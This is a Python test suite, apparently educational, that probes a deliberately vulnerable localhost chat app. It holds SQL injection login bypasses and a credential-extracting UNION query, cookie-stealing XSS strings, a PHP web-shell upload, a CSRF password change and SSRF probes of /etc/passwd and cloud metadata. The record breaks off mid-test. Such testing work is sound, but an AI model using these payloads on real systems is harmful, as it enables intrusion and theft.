#!/usr/bin/env python3

import requests
import json
import sys
import time
from typing import Dict, List, Tuple
from dataclasses import dataclass
from urllib.parse import urljoin
import html

@dataclass
class TestResult:
    name: str
    success: bool
    details: str
    payload: str
    description: str  # Added field for educational purposes

class SimpleChatVulnerabilityTester:
    def __init__(self, base_url: str = "http://localhost:5001"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results: List[TestResult] = []

    def run_all_tests(self):
        """Run all vulnerability tests"""
        print("\n=== Starting SimpleChat Vulnerability Testing Suite ===")
        print("This suite demonstrates various web application vulnerabilities in SimpleChat.")
        print("Each test includes educational information about the vulnerability.")
        print("⚠️  For educational purposes only! ⚠️\n")
        
        try:
            # Authentication Attacks
            self.test_default_credentials()
            
            # SQL Injection in Login
            self.test_sql_injection_login()
            
            # Cookie Manipulation
            self.test_cookie_manipulation()
            
            # Predictable Conversation Hash
            self.test_predictable_conversation_hash()
            
            # XSS in Messages
            self.test_xss_in_messages()
            
            # CSRF Vulnerability
            self.test_csrf_password_change()
            
            # File Upload Vulnerability
            self.test_unrestricted_file_upload()
            
            # SSRF Vulnerability
            self.test_ssrf_profile_picture()
            
            # Sensitive Data Exposure
            self.test_sensitive_data_exposure()
            
            # SQL Injection in Search
            self.test_sql_injection_search()
            
            # SQL Injection in Messages
            self.test_sql_injection_messages()
            
            # Debug Mode Detection
            self.test_debug_mode()
            
        except Exception as e:
            print(f"Error running tests: {str(e)}")
            
        self.print_results()

    def add_result(self, name: str, success: bool, details: str, payload: str, description: str):
        """Add a test result with educational information"""
        self.results.append(TestResult(name, success, details, payload, description))

    def test_default_credentials(self):
        """Test default credentials"""
        print("\n=== Testing Default Credentials ===")
        description = """
        Vulnerability: Default/Hardcoded Credentials
        Impact: Attackers can gain unauthorized access using known default credentials
        How it works: The application ships with default admin credentials that
        are either not changed or cannot be changed.
        
        Prevention:
        1. Force password change on first login
        2. No hardcoded credentials in code
        3. Generate random admin password during installation
        4. Implement strong password policies
        """
        
        try:
            response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={
                    "username": "admin",
                    "password": "admin123"
                }
            )
            
            # Check if login was successful by looking for redirection or dashboard content
            success = response.status_code == 302 or "dashboard" in response.text.lower() or "messages" in response.text.lower()
            
            details = (
                "Successfully logged in with default admin credentials"
                if success
                else "Default credentials test failed"
            )
            
            self.add_result(
                "Default Credentials",
                success,
                details,
                "admin:admin123",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Default Credentials",
                False,
                f"Error: {str(e)}",
                "admin:admin123",
                description
            )

    def test_sql_injection_login(self):
        """Test SQL injection in login form"""
        print("\n=== Testing SQL Injection (Login) ===")
        description = """
        Vulnerability: SQL Injection in Login Form
        Impact: Attackers can bypass authentication or extract data
        How it works: User input is directly concatenated into SQL queries
        without proper sanitization or parameterization.
        
        Prevention:
        1. Use parameterized queries
        2. Input validation and sanitization
        3. Use ORM with proper escaping
        4. Principle of least privilege for DB user
        """
        
        payloads = [
            {
                "name": "Basic login bypass",
                "username": "admin' OR '1'='1",
                "password": "anything"
            },
            {
                "name": "Basic login bypass via password",
                "username": "admin",
                "password": "' OR '1'='1"
            },
            {
                "name": "Comment out password check",
                "username": "admin'--",
                "password": "anything"
            },
            {
                "name": "OR with both fields",
                "username": "' OR 1=1 OR '",
                "password": "' OR 1=1 OR '"
            },
            {
                "name": "Simple OR condition",
                "username": "' OR 1=1 --",
                "password": "anything"
            }
        ]
        
        successes = []
        for payload in payloads:
            try:
                # Clear any existing cookies
                self.session.cookies.clear()
                
                response = self.session.post(
                    urljoin(self.base_url, "/login"),
                    data={
                        "username": payload["username"],
                        "password": payload["password"]
                    },
                    allow_redirects=False  # Don't follow redirects to better detect success
                )
                
                # Check if login was successful by looking for redirection or cookies
                if response.status_code == 302 or 'current_user' in self.session.cookies:
                    successes.append(payload["name"])
                    break  # One success is enough
                
                # If we got redirected, check the next page for signs of successful login
                if response.status_code == 200 and "messages" in response.text.lower():
                    successes.append(payload["name"])
                    break  # One success is enough
                
            except Exception as e:
                print(f"Error testing SQL injection: {str(e)}")
                continue
        
        success = len(successes) > 0
        details = (
            f"Successfully exploited SQL injection: {', '.join(successes)}"
            if success
            else "SQL injection tests failed"
        )
        
        self.add_result(
            "SQL Injection (Login)",
            success,
            details,
            str(payloads),
            description
        )

    def test_cookie_manipulation(self):
        """Test cookie manipulation vulnerabilities"""
        print("\n=== Testing Cookie Manipulation ===")
        description = """
        Vulnerability: Cookie Manipulation / Request Forgery
        Impact: Attackers can modify cookies to impersonate other users
        How it works: The application uses plain text cookies for authentication
        without proper validation or signing.
        
        Prevention:
        1. Use secure session management
        2. Sign cookies with strong cryptographic keys
        3. Implement proper authentication checks
        4. Use secure session tokens instead of plaintext values
        """
        
        try:
            # Clear any existing cookies
            self.session.cookies.clear()
            
            # First check if we can access profile without login
            initial_response = self.session.get(
                urljoin(self.base_url, "/profile"),
                allow_redirects=False
            )
            
            # If we're redirected, we need to login
            if initial_response.status_code == 302:
                # First, check if the app is using Flask sessions
                # Try to login properly first
                login_response = self.session.post(
                    urljoin(self.base_url, "/login"),
                    data={"username": "admin", "password": "admin123"}
                )
                
                # Check if we got a session cookie (Flask's default is 'session')
                has_session_cookie = 'session' in self.session.cookies
                
                # Now logout to clear the session
                self.session.get(urljoin(self.base_url, "/logout"))
                
                # Now try with plain cookies
                self.session.cookies.clear()
                self.session.cookies.set('current_user', 'admin')
                self.session.cookies.set('is_admin', 'true')
                
                # Try to access admin profile
                admin_response = self.session.get(
                    urljoin(self.base_url, "/profile"),
                    allow_redirects=False
                )
                
                # Check if we were redirected (secure behavior) or got access (vulnerable)
                is_redirected = admin_response.status_code == 302
                
                # The app is vulnerable if:
                # 1. It doesn't use session cookies AND plain cookies work, OR
                # 2. Plain cookies work despite having session cookies
                if has_session_cookie:
                    # If it has session cookies but plain cookies still work, it's vulnerable
                    success = not is_redirected
                    if success:
                        details = "Application uses session cookies but still accepts plain cookies"
                    else:
                        details = "Application uses secure session cookies and rejects plain cookies"
                else:
                    # If it doesn't have session cookies, it's vulnerable
                    success = True
                    details = "Application does not use secure session cookies"
            else:
                # If we can access profile without login, that's a different vulnerability
                success = True
                details = "Authentication check not working - could access profile without login"
            
            self.add_result(
                "Cookie Manipulation",
                success,
                details,
                "Set cookie: current_user=admin, is_admin=true",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Cookie Manipulation",
                False,
                f"Error: {str(e)}",
                "Cookie manipulation",
                description
            )

    def test_predictable_conversation_hash(self):
        """Test predictable conversation hash vulnerability"""
        print("\n=== Testing Predictable Conversation Hash ===")
        description = """
        Vulnerability: Predictable Conversation Hash
        Impact: Attackers can access private conversations between other users
        How it works: The application uses a weak hash function (MD5) with predictable
        inputs to generate conversation identifiers.
        
        Prevention:
        1. Use strong cryptographic functions
        2. Include unpredictable values (e.g., random salt)
        3. Implement proper access controls
        4. Don't rely on obscurity for security
        """
        
        try:
            # Clear any existing cookies
            self.session.cookies.clear()
            
            # First login as a user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            # Try a brute force approach - generate hashes for different user combinations
            import hashlib
            
            # Try different combinations of user IDs
            test_hashes = []
            for i in range(1, 5):  # User ID 1
                for j in range(i+1, 6):  # User ID 2
                    # Ensure smaller ID is first
                    user1, user2 = min(i, j), max(i, j)
                    conversation_string = f"conversation_{user1}_{user2}"
                    hash_value = hashlib.md5(conversation_string.encode()).hexdigest()
                    test_hashes.append((hash_value, user1, user2))
            
            # Try each hash
            for test_hash, user1, user2 in test_hashes:
                try:
                    convo_response = self.session.get(
                        urljoin(self.base_url, f"/conversation/{test_hash}")
                    )
                    
                    # Check if we successfully accessed a conversation
                    if convo_response.status_code == 200 and "message" in convo_response.text.lower():
                        success = True
                        details = f"Successfully accessed conversation between users {user1} and {user2} with hash: {test_hash}"
                        break
                except:
                    continue
            else:
                # If we didn't break out of the loop, all tests failed
                success = False
                details = "Could not access any conversations with predicted hashes"
            
            self.add_result(
                "Predictable Conversation Hash",
                success,
                details,
                f"Accessed conversation with hash: {test_hash if success else None}",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Predictable Conversation Hash",
                False,
                f"Error: {str(e)}",
                "Conversation hash test",
                description
            )

    def test_xss_in_messages(self):
        """Test XSS vulnerability in messages"""
        print("\n=== Testing XSS in Messages ===")
        description = """
        Vulnerability: Cross-Site Scripting (XSS) in Messages
        Impact: Attackers can inject malicious scripts that execute in victims' browsers
        How it works: User input in messages is not properly sanitized or escaped
        before being displayed to other users.
        
        Prevention:
        1. Input validation and sanitization
        2. Output encoding
        3. Content Security Policy (CSP)
        4. Use safe templating engines that auto-escape content
        """
        
        try:
            # Clear any existing cookies
            self.session.cookies.clear()
            
            # First login as a user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "john.doe", "password": "password123"}
            )
            
            # Find a user to message
            response = self.session.get(urljoin(self.base_url, "/new_chat"))
            
            # Extract a username from the response
            import re
            usernames = re.findall(r'value="([^"]+)"', response.text)
            target_user = None
            for username in usernames:
                if username and username != "john.doe" and username != "":
                    target_user = username
                    break
            
            if not target_user:
                target_user = "admin"  # Fallback to admin
            
            # XSS payloads to test
            xss_payloads = [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror='alert(1)'>",
                "<svg/onload=alert('XSS')>"
            ]
            
            # Send a message with XSS payload
            success = False
            successful_payload = None
            
            # First check what the form field name is by examining the page
            convo_page = self.session.get(
                urljoin(self.base_url, f"/messages/{target_user}")
            )
            
            # Look for the form field name in the HTML
            form_field_names = re.findall(r'name="([^"]+)".*?placeholder="Type a message', convo_page.text, re.DOTALL)
            message_field_name = form_field_names[0] if form_field_names else "message"
            
            for payload in xss_payloads:
                # Try different field names that might be used
                for field_name in [message_field_name, "content", "message"]:
                    try:
                        message_data = {field_name: payload}
                        message_response = self.session.post(
                            urljoin(self.base_url, f"/messages/{target_user}"),
                            data=message_data
                        )
                        
                        # Check if the payload was stored (appears in the response)
                        if payload in message_response.text:
                            success = True
                            successful_payload = payload
                            break
                    except:
                        continue
                
                if success:
                    break
            
            if success:
                details = f"Successfully stored XSS payload in message: {successful_payload}"
            else:
                details = "Failed to store XSS payloads in messages"
            
            self.add_result(
                "XSS in Messages",
                success,
                details,
                str(xss_payloads),
                description
            )
            
        except Exception as e:
            self.add_result(
                "XSS in Messages",
                False,
                f"Error: {str(e)}",
                "XSS test",
                description
            )

    def test_csrf_password_change(self):
        """Test CSRF vulnerability in password change"""
        print("\n=== Testing CSRF in Password Change ===")
        description = """
        Vulnerability: Cross-Site Request Forgery (CSRF)
        Impact: Attackers can perform actions on behalf of authenticated users
        How it works: The application accepts state-changing requests without
        verifying they originated from a legitimate source.
        
        Prevention:
        1. Implement CSRF tokens
        2. SameSite cookie attribute
        3. Custom request headers
        4. Verify Origin/Referer headers
        """
        
        try:
            # First login as a user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "admin", "password": "admin123"}
            )
            
            if login_response.status_code != 200:
                self.add_result(
                    "CSRF Vulnerability",
                    False,
                    "Failed to login for CSRF test",
                    "Login attempt",
                    description
                )
                return
            
            # First, get the change password page to check for CSRF tokens
            change_password_page = self.session.get(
                urljoin(self.base_url, "/change-password")
            )
            
            if change_password_page.status_code != 200:
                self.add_result(
                    "CSRF Vulnerability",
                    False,
                    "Could not access change password page",
                    "Change password page access attempt",
                    description
                )
                return
            
            # Check if the page contains a CSRF token
            has_csrf_token = 'csrf_token' in change_password_page.text
            
            # If there's a CSRF token, extract it to use in our test
            csrf_token = None
            if has_csrf_token:
                import re
                csrf_match = re.search(r'name="csrf_token".*?value="([^"]+)"', change_password_page.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)
            
            # Try to change password with a different origin but WITHOUT the CSRF token
            headers = {
                "Origin": "http://evil-site.com",
                "Referer": "http://evil-site.com/csrf.html"
            }
            
            data = {
                "current_password": "admin123",
                "new_password": "hacked123",
                "confirm_password": "hacked123"
            }
            
            # If we found a CSRF token, try without it first
            csrf_response_without_token = self.session.post(
                urljoin(self.base_url, "/change-password"),
                data=data,
                headers=headers
            )
            
            # Check if the password change was rejected (secure behavior)
            # Look for error messages or redirects
            rejected_without_token = (
                "error" in csrf_response_without_token.text.lower() or 
                "invalid" in csrf_response_without_token.text.lower() or
                "csrf" in csrf_response_without_token.text.lower() or
                csrf_response_without_token.status_code == 302
            )
            
            # Now try with the CSRF token if we found one
            if csrf_token:
                data["csrf_token"] = csrf_token
                csrf_response_with_token = self.session.post(
                    urljoin(self.base_url, "/change-password"),
                    data=data,
                    headers=headers
                )
                
                # Check if the password change was successful with the token
                success_with_token = (
                    "success" in csrf_response_with_token.text.lower() or 
                    "password changed" in csrf_response_with_token.text.lower()
                )
                
                # The application is secure if:
                # 1. It rejected the request without a token AND
                # 2. It accepted the request with a token
                is_secure = rejected_without_token and success_with_token
                
                if is_secure:
                    self.add_result(
                        "CSRF Vulnerability",
                        False,
                        "Application implements proper CSRF protection with tokens",
                        "CSRF token required for form submission",
                        description
                    )
                    return
                elif rejected_without_token:
                    # If it rejected without token but didn't accept with token,
                    # it might be using other CSRF protections or have other issues
                    self.add_result(
                        "CSRF Vulnerability",
                        False,
                        "Application rejects requests without CSRF tokens",
                        "CSRF token required for form submission",
                        description
                    )
                    return
            elif rejected_without_token:
                # If no CSRF token was found but the request was still rejected,
                # the app might be using other CSRF protections
                self.add_result(
                    "CSRF Vulnerability",
                    False,
                    "Application rejects cross-origin requests (possible CSRF protection)",
                    "Request rejected without CSRF token",
                    description
                )
                return
            
            # If we get here, the application either:
            # 1. Doesn't use CSRF tokens, or
            # 2. Doesn't properly validate them
            success = not rejected_without_token
            
            details = (
                "Successfully changed password via CSRF (no CSRF protection)"
                if success
                else "CSRF test inconclusive - request was rejected but no CSRF token found"
            )
            
            self.add_result(
                "CSRF Vulnerability",
                success,
                details,
                "POST request with different origin",
                description
            )
            
        except Exception as e:
            self.add_result(
                "CSRF Vulnerability",
                False,
                f"Error: {str(e)}",
                "CSRF test",
                description
            )

    def test_unrestricted_file_upload(self):
        """Test unrestricted file upload vulnerability"""
        print("\n=== Testing Unrestricted File Upload ===")
        description = """
        Vulnerability: Unrestricted File Upload
        Impact: Attackers can upload malicious files that could lead to remote code execution
        How it works: The application allows uploading files without proper validation
        of file type, content, or size.
        
        Prevention:
        1. Validate file extensions and content types
        2. Scan file contents for malicious code
        3. Store uploaded files outside web root
        4. Generate random filenames
        5. Set proper permissions on uploaded files
        """
        
        try:
            # First login as a user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "admin", "password": "admin123"}
            )
            
            if login_response.status_code != 200:
                self.add_result(
                    "Unrestricted File Upload",
                    False,
                    "Failed to login for file upload test",
                    "Login attempt",
                    description
                )
                return
            
            # Create a malicious PHP file
            php_payload = """<?php
            echo "Malicious file executed!";
            system($_GET['cmd']);
            ?>"""
            
            files = {
                'file': ('malicious.php', php_payload, 'application/x-php')
            }
            
            # Try to upload the file
            upload_response = self.session.post(
                urljoin(self.base_url, "/upload-file"),
                files=files
            )
            
            # Check if the upload was rejected (secure behavior)
            if "error" in upload_response.text.lower() or "invalid" in upload_response.text.lower():
                self.add_result(
                    "Unrestricted File Upload",
                    False,
                    "Application correctly rejected malicious file upload",
                    "Attempted to upload malicious.php",
                    description
                )
                return
            
            # If we get here, the file might have been accepted
            # Try to find the uploaded file path in the response
            import re
            file_path_match = re.search(r'(/uploads/[^"\'<>\s]+)', upload_response.text)
            
            if file_path_match:
                file_path = file_path_match.group(1)
                
                # Try to access the uploaded file
                file_response = self.session.get(
                    urljoin(self.base_url, file_path)
                )
                
                # If we can access the file and it contains our payload, the app is vulnerable
                success = file_response.status_code == 200 and "<?php" in file_response.text
                
                details = (
                    f"Successfully uploaded and accessed malicious PHP file at {file_path}"
                    if success
                    else "File was uploaded but could not be accessed or executed"
                )
            else:
                # If we can't find the file path, check if the upload was successful
                success = "success" in upload_response.text.lower() and "php" in upload_response.text.lower()
                
                details = (
                    "Successfully uploaded malicious PHP file (path not found in response)"
                    if success
                    else "File upload test inconclusive - could not determine if file was accepted"
                )
            
            self.add_result(
                "Unrestricted File Upload",
                success,
                details,
                "Uploaded malicious.php with PHP code",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Unrestricted File Upload",
                False,
                f"Error: {str(e)}",
                "File upload test",
                description
            )

    def test_ssrf_profile_picture(self):
        """Test SSRF vulnerability in profile picture URL"""
        print("\n=== Testing SSRF in Profile Picture URL ===")
        description = """
        Vulnerability: Server-Side Request Forgery (SSRF)
        Impact: Attackers can make the server request internal resources
        How it works: The application makes HTTP requests to user-supplied URLs
        without proper validation.
        
        Prevention:
        1. Validate and sanitize URL input
        2. Use allowlists for domains
        3. Block requests to internal networks
        4. Disable unnecessary URL schemes
        """
        
        try:
            # First login as a user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "admin", "password": "admin123"}
            )
            
            if login_response.status_code != 200:
                self.add_result(
                    "SSRF Vulnerability",
                    False,
                    "Failed to login for SSRF test",
                    "Login attempt",
                    description
                )
                return
            
            # First, get the update profile picture page
            profile_page = self.session.get(
                urljoin(self.base_url, "/update-profile-picture")
            )
            
            # Check if the page exists
            if profile_page.status_code != 200:
                self.add_result(
                    "SSRF Vulnerability",
                    False,
                    "Could not access update profile picture page",
                    "Page access attempt",
                    description
                )
                return
            
            # Check if the form has CSRF protection
            has_csrf_token = 'csrf_token' in profile_page.text
            csrf_token = None
            if has_csrf_token:
                import re
                csrf_match = re.search(r'name="csrf_token".*?value="([^"]+)"', profile_page.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)
            
            # SSRF payloads to test
            ssrf_payloads = [
                {
                    "url": "http://localhost:22",
                    "description": "Internal SSH port scan"
                },
                {
                    "url": "file:///etc/passwd",
                    "description": "Local file access"
                },
                {
                    "url": "http://169.254.169.254/latest/meta-data",
                    "description": "AWS metadata service"
                },
                {
                    "url": "http://10.0.0.1",
                    "description": "Internal network access"
                }
            ]
            
            # Also test a valid URL to establish baseline
            valid_url = "https://example.com/image.jpg"
            
            # First try the valid URL
            data = {"picture_url": valid_url}
            if csrf_token:
                data["csrf_token"] = csrf_token
                
            valid_response = self.session.post(
                urljoin(self.base_url, "/update-profile-picture"),
                data=data
            )
            
            # Check if the valid URL was accepted
            valid_url_accepted = valid_response.status_code == 200 and "success" in valid_response.text.lower() and "error" not in valid_response.text.lower()
            
            # If the valid URL wasn't accepted, the test is inconclusive
            if not valid_url_accepted:
                # Check if the app is rejecting all URLs (which is also secure)
                self.add_result(
                    "SSRF Vulnerability",
                    False,
                    "Application rejects all URL inputs - secure behavior",
                    valid_url,
                    description
                )
                return
            
            # Count how many payloads were rejected
            rejected_count = 0
            total_payloads = len(ssrf_payloads)
            
            # Now try each SSRF payload
            for payload in ssrf_payloads:
                data = {"picture_url": payload["url"]}
                if csrf_token:
                    data["csrf_token"] = csrf_token
                    
                ssrf_response = self.session.post(
                    urljoin(self.base_url, "/update-profile-picture"),
                    data=data
                )
                
                # A secure application should reject these URLs
                # Check if the URL was accepted (vulnerable) or rejected (secure)
                response_text = ssrf_response.text.lower()
                
                # Check for validation error messages that indicate proper URL validation
                validation_indicators = [
                    "invalid url",
                    "url not allowed",
                    "invalid scheme",
                    "internal network",
                    "localhost",
                    "private ip",
                    "local address",
                    "error",
                    "invalid",
                    "rejected"
                ]
                
                # If we see validation indicators or the request was rejected, the app is likely secure
                if any(indicator in response_text for indicator in validation_indicators) or ssrf_response.status_code == 302:
                    rejected_count += 1
                    continue
                
                # If there's no error message and the response indicates success, it's vulnerable
                if "success" in response_text and "error" not in response_text:
                    self.add_result(
                        "SSRF Vulnerability",
                        True,
                        f"Successfully set profile picture to SSRF URL: {payload['url']} ({payload['description']})",
                        payload["url"],
                        description
                    )
                    return
                
                # Also check for specific error messages that indicate the request was made
                # but failed, rather than being rejected before the request
                request_made_indicators = [
                    "timeout",
                    "connection refused",
                    "could not connect",
                    "failed to fetch",
                    "status code",
                    "response"
                ]
                
                # If we see request indicators, the app likely made the request (vulnerable)
                if any(indicator in response_text for indicator in request_made_indicators):
                    self.add_result(
                        "SSRF Vulnerability",
                        True,
                        f"Successfully triggered SSRF with URL: {payload['url']} ({payload['description']})",
                        payload["url"],
                        description
                    )
                    return
            
            # If we get here, check how many payloads were rejected
            if rejected_count == total_payloads:
                # All payloads were rejected - secure
                self.add_result(
                    "SSRF Vulnerability",
                    False,
                    "Application properly rejected all SSRF attempts",
                    str([p["url"] for p in ssrf_payloads]),
                    description
                )
            else:
                # Some payloads weren't clearly rejected or accepted - inconclusive
                self.add_result(
                    "SSRF Vulnerability",
                    False,
                    f"SSRF test inconclusive - {rejected_count}/{total_payloads} payloads rejected",
                    str([p["url"] for p in ssrf_payloads]),
                    description
                )
            
        except Exception as e:
            self.add_result(
                "SSRF Vulnerability",
                False,
                f"Error: {str(e)}",
                "SSRF test",
                description
            )

    def test_sensitive_data_exposure(self):
        """Test sensitive data exposure in user profiles"""
        print("\n=== Testing Sensitive Data Exposure ===")
        description = """
        Vulnerability: Sensitive Data Exposure
        Impact: Attackers can access sensitive user information
        How it works: The application exposes sensitive data in:
        - User profiles
        - API responses
        - Debug endpoints
        
        Prevention:
        1. Minimize sensitive data exposure
        2. Implement proper data classification
        3. Encrypt sensitive data
        4. Use proper access controls
        """
        
        try:
            # First login as a user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "admin", "password": "admin123"}
            )
            
            if login_response.status_code != 200:
                self.add_result(
                    "Sensitive Data Exposure",
                    False,
                    "Failed to login for sensitive data exposure test",
                    "Login attempt",
                    description
                )
                return
            
            # Check for sensitive data in profile
            profile_response = self.session.get(
                urljoin(self.base_url, "/profile")
            )
            
            if profile_response.status_code != 200:
                self.add_result(
                    "Sensitive Data Exposure",
                    False,
                    "Could not access profile page",
                    "Profile page access attempt",
                    description
                )
                return
            
            # Highly sensitive data patterns that should never be exposed
            highly_sensitive_patterns = [
                "credit_card",
                "credit card",
                "ssn",
                "social security"
            ]
            
            # Moderately sensitive data patterns that should be protected
            moderately_sensitive_patterns = [
                "date_of_birth",
                "date of birth",
                "address",
                "phone"
            ]
            
            # Check if sensitive data is exposed
            response_text = profile_response.text.lower()
            
            # First check for highly sensitive data
            highly_exposed_data = []
            for pattern in highly_sensitive_patterns:
                # Check if the pattern is in the response AND has a value
                # We're looking for patterns like "SSN: 123-45-6789" not just "SSN:"
                import re
                # Match pattern followed by colon and non-empty content
                match = re.search(f"{pattern}[^:]*:[^:]+", response_text)
                if match and len(match.group(0).split(':')[1].strip()) > 0:
                    highly_exposed_data.append(pattern)
            
            # Then check for moderately sensitive data
            moderately_exposed_data = []
            for pattern in moderately_sensitive_patterns:
                # Check if the data is actually displayed (not just field names)
                # Look for patterns like "Address: 123 Main St" or similar
                match = re.search(f"{pattern}[^:]*:[^:]+", response_text)
                if match and len(match.group(0).split(':')[1].strip()) > 0:
                    moderately_exposed_data.append(pattern)
            
            # Also check debug endpoints
            debug_endpoints = [
                "/debug/all-users",
                "/debug/users",
                "/debug/data"
            ]
            
            debug_exposed_data = []
            for endpoint in debug_endpoints:
                debug_response = self.session.get(
                    urljoin(self.base_url, endpoint)
                )
                
                if debug_response.status_code == 200:
                    debug_text = debug_response.text.lower()
                    
                    # Check if the response contains sensitive data
                    for pattern in highly_sensitive_patterns:
                        if pattern in debug_text:
                            # Check if it's just a field name or actual data
                            match = re.search(f'"{pattern}"\\s*:\\s*"[^"]+"', debug_text)
                            if match and len(match.group(0).split(':')[1].strip()) > 3:
                                debug_exposed_data.append(f"{pattern} (in {endpoint})")
            
            # Determine if the application is vulnerable
            # It's highly vulnerable if highly sensitive data is exposed
            # It's moderately vulnerable if only moderately sensitive data is exposed
            highly_vulnerable = len(highly_exposed_data) > 0 or len(debug_exposed_data) > 0
            moderately_vulnerable = len(moderately_exposed_data) > 0
            
            if highly_vulnerable:
                success = True
                exposed_data = highly_exposed_data + debug_exposed_data
                details = f"Found exposed highly sensitive data: {', '.join(exposed_data)}"
            elif moderately_vulnerable:
                # For moderately sensitive data, we'll report it but with a note
                success = False  # Changed to False since this is acceptable in many cases
                details = f"Found exposed moderately sensitive data: {', '.join(moderately_exposed_data)} (acceptable in many cases)"
            else:
                success = False
                details = "No sensitive data exposure found"
            
            self.add_result(
                "Sensitive Data Exposure",
                success,
                details,
                "Checked user profile and debug endpoints",
                description
            )
            
        except Exception as e:
            self.add_result(
                "Sensitive Data Exposure",
                False,
                f"Error: {str(e)}",
                "Sensitive data exposure test",
                description
            )

    def test_sql_injection_search(self):
        """Test SQL injection in search functionality"""
        print("\n=== Testing SQL Injection (Search) ===")
        description = """
        Vulnerability: SQL Injection in Search Function
        Impact: Attackers can extract sensitive data or manipulate database
        How it works: Search query is directly concatenated into SQL query
        without proper sanitization or parameterization.
        
        Prevention:
        1. Use parameterized queries
        2. Input validation and sanitization
        3. Use ORM with proper escaping
        4. Principle of least privilege for DB user
        """
        
        try:
            # First login as a user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "admin", "password": "admin123"}
            )
            
            if login_response.status_code != 200:
                self.add_result(
                    "SQL Injection (Search)",
                    False,
                    "Failed to login for SQL injection test",
                    "Login attempt",
                    description
                )
                return
            
            # First, make a normal search to establish baseline
            normal_search = self.session.get(
                urljoin(self.base_url, "/search?q=user")
            )
            
            if normal_search.status_code != 200:
                self.add_result(
                    "SQL Injection (Search)",
                    False,
                    "Could not access search functionality",
                    "Normal search attempt",
                    description
                )
                return
            
            # Count the number of results in a normal search
            normal_results_count = normal_search.text.lower().count('user-id')
            
            # SQL injection payloads to test
            sql_payloads = [
                {
                    "payload": "' OR '1'='1",
                    "description": "Show all users"
                },
                {
                    "payload": "x' OR 1=1 --",
                    "description": "Show all users (alternative)"
                },
                {
                    "payload": "' UNION SELECT username,password,id,email,full_name,address,phone FROM user--",
                    "description": "Extract user credentials"
                }
            ]
            
            for payload in sql_payloads:
                # Try SQL injection in search
                search_response = self.session.get(
                    urljoin(self.base_url, f"/search?q={payload['payload']}")
                )
                
                if search_response.status_code != 200:
                    continue
                
                # Check if the injection was successful by comparing result counts
                # A successful injection should return more results than a normal search
                injection_results_count = search_response.text.lower().count('user-id')
                
                # If we got significantly more results, it's likely vulnerable
                if injection_results_count > normal_results_count * 1.5:
                    success = True
                    details = f"Successfully exploited SQL injection with payload: {payload['payload']} ({payload['description']})"
                    self.add_result(
                        "SQL Injection (Search)",
                        success,
                        details,
                        payload['payload'],
                        description
                    )
                    return
                
                # Also check for signs of successful injection in the response
                response_text = search_response.text.lower()
                
                # Check for sensitive data that shouldn't be in search results
                success_indicators = [
                    "password",
                    "password_hash",
                    "credit_card",
                    "ssn",
                    "sqlite_master",
                    "create table"
                ]
                
                if any(indicator in response_text for indicator in success_indicators):
                    success = True
                    details = f"Successfully exploited SQL injection with payload: {payload['payload']} ({payload['description']})"
                    self.add_result(
                        "SQL Injection (Search)",
                        success,
                        details,
                        payload['payload'],
                        description
                    )
                    return
            
            # If we get here, none of the payloads worked
            self.add_result(
                "SQL Injection (Search)",
                False,
                "Application properly handled SQL injection attempts",
                str([p["payload"] for p in sql_payloads]),
                description
            )
            
        except Exception as e:
            self.add_result(
                "SQL Injection (Search)",
                False,
                f"Error: {str(e)}",
                "SQL injection test",
                description
            )

    def test_sql_injection_messages(self):
        """Test SQL injection in message sending functionality"""
        print("\n=== Testing SQL Injection (Messages) ===")
        description = """
        Vulnerability: SQL Injection in Message Content
        Impact: Attackers can extract sensitive data or manipulate database through message content
        How it works: Message content might be vulnerable to SQL injection if the application
        doesn't properly sanitize or parameterize the input before inserting it into the database.
        
        Prevention:
        1. Use parameterized queries (already implemented, but testing for completeness)
        2. Input validation and sanitization
        3. Use ORM with proper escaping
        4. Principle of least privilege for DB user
        """
        
        try:
            # First login as a user
            login_response = self.session.post(
                urljoin(self.base_url, "/login"),
                data={"username": "admin", "password": "admin123"}
            )
            
            if login_response.status_code != 200:
                self.add_result(
                    "SQL Injection (Messages)",
                    False,
                    "Failed to login for message SQL injection test",
                    "Login attempt",
                    description
                )
                return
            
            # First, check if we can access the messages page
            messages_page = self.session.get(
                urljoin(self.base_url, "/messages")
            )
            
            if messages_page.status_code != 200:
                self.add_result(
                    "SQL Injection (Messages)",
                    False,
                    "Could not access messages page",
                    "Messages page access attempt",
                    description
                )
                return
            
            # Find a user to message
            # Try to find a conversation link in the messages page
            import re
            conversation_match = re.search(r'href="/messages/([^"]+)"', messages_page.text)
            
            if conversation_match:
                recipient = conversation_match.group(1)
            else:
                # If no existing conversation, use a default recipient
                recipient = "demo"
            
            # Check if the recipient exists by trying to access their conversation page
            conversation_page = self.session.get(
                urljoin(self.base_url, f"/messages/{recipient}")
            )
            
            if conversation_page.status_code != 200:
                self.add_result(
                    "SQL Injection (Messages)",
                    False,
                    f"Could not access conversation with {recipient}",
                    "Conversation page access attempt",
                    description
                )
                return
            
            # Check if the form has CSRF protection
            has_csrf_token = 'csrf_token' in conversation_page.text
            csrf_token = None
            if has_csrf_token:
                csrf_match = re.search(r'name="csrf_token".*?value="([^"]+)"', conversation_page.text)
                if csrf_match:
                    csrf_token = csrf_match.group(1)
            
            # Send a normal message first to establish baseline
            normal_message = "This is a normal test message " + str(int(time.time()))  # Add timestamp to make it unique
            data = {"message": normal_message}
            if csrf_token:
                data["csrf_token"] = csrf_token
                
            normal_response = self.session.post(
                urljoin(self.base_url, f"/messages/{recipient}"),
                data=data
            )
            
            # Check if we can send messages at all
            if normal_response.status_code != 200 and "success" not in normal_response.text.lower():
                self.add_result(
                    "SQL Injection (Messages)",
                    False,
